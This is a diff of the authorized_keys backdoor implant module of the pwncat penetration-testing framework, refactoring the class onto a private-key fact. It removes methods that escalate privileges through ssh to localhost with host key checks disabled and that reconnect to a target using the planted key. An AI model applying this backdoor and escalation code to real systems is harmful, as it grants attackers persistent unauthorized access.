@@ -3,23 +3,28 @@ import os
 import time
 import shutil
 import socket
+import pathlib
 import subprocess
 
-from pwncat.facts import Implant
+from pwncat.facts import PrivateKey
 from pwncat.modules import Status, Argument, ModuleFailed
 from pwncat.platform.linux import Linux
 from pwncat.modules.implant import ImplantModule
 
 
-class AuthorizedKeyImplant(Implant):
+class AuthorizedKeyImplant(PrivateKey):
     """ A public key added to a user's authorized keys file """
 
     def __init__(self, source, user, key, pubkey):
         super().__init__(
-            source=source, types=["implant.remote", "implant.replace"], uid=user.id
+            source=source,
+            path=key,
+            uid=user.id,
+            content=pathlib.Path(key).read_text(),
+            encrypted=False,
+            authorized=True,
         )
 
-        self.key = key
         self.pubkey = pubkey
 
     def title(self, session: "pwncat.manager.Session"):
@@ -27,7 +32,13 @@ class AuthorizedKeyImplant(Implant):
         user = session.find_user(uid=self.uid)
         return f"backdoor public key added to [blue]{user.name}[/blue] authorized_keys"
 
+    def description(self, session: "pwncat.manager.Session"):
+        """ We don't want to print the whole key, since we installed it. """
+        return None
+
     def remove(self, session: "pwncat.manager.Session"):
+        """Normal private key facts don't remove the key, but we need to. In this
+        case the fact is removed as well, unlike a standard private key fact."""
 
         current_user = session.current_user()
         user = session.find_user(uid=self.uid)
@@ -60,81 +71,6 @@ class AuthorizedKeyImplant(Implant):
         # Fix permissions (in case the file was replaced by the above write)
         session.platform.chown(str(authkeys_path), user.id, user.gid)
         authkeys_path.chmod(0o600)
-
-    def escalate(self, session: "pwncat.manager.Session"):
-
-        if session.platform.which("ssh") is None:
-            raise ModuleFailed("no local ssh binary")
-
-        current_user = session.current_user()
-        user = session.find_user(uid=self.uid)
-
-        # Upload the private key
-        with session.platform.tempfile(suffix="", mode="w") as dest:
-            privkey_path = dest.name
-            with open(self.key, "r") as source:
-                shutil.copyfileobj(source, dest)
-
-        # Set permissions on private key
-        session.platform.chown(privkey_path, current_user.id, current_user.gid)
-        session.platform.chmod(privkey_path, 0o600)
-
-        # Execute SSH
-        proc = session.platform.Popen(
-            [
-                "ssh",
-                "-i",
-                privkey_path,
-                "-o",
-                "StrictHostKeyChecking=no",
-                "-o",
-                "PasswordAuthentication=no",
-                "-o",
-                "ChallengeResponseAuthentication=no",
-                f"{user.name}@localhost",
-            ],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE,
-        )
-
-        # Wait a second to see if there's an error from ssh
-        time.sleep(1)
-        if proc.poll() is not None:
-            raise ModuleFailed(
-                f"ssh to localhost failed w/ exit code {proc.returncode}"
-            )
-
-        # Detach the popen object
-        proc.detach()
-
-        return lambda session: session.platform.channel.send(b"exit\n")
-
-    def trigger(
-        self, manager: "pwncat.manager.Manager", target: "pwncat.target.Target"
-    ) -> "pwncat.manager.Session":
-        """ Trigger a listener or connection to the target using this implant """
-
-        # Find the user for this UID
-        for fact in target.facts:
-            if "user" in fact.types and fact.id == self.uid:
-                user = fact
-                break
-        else:
-            raise ModuleFailed(f"unknown username for uid={self.uid}")
-
-        try:
-            # Connect via SSH
-            session = manager.create_session(
-                "linux",
-                host=target.public_address[0],
-                user=user.name,
-                identity=self.key,
-            )
-        except ChannelError as exc:
-            raise ModuleFailed(str(exc)) from exc
-
-        return session
 
 
 class Module(ImplantModule):
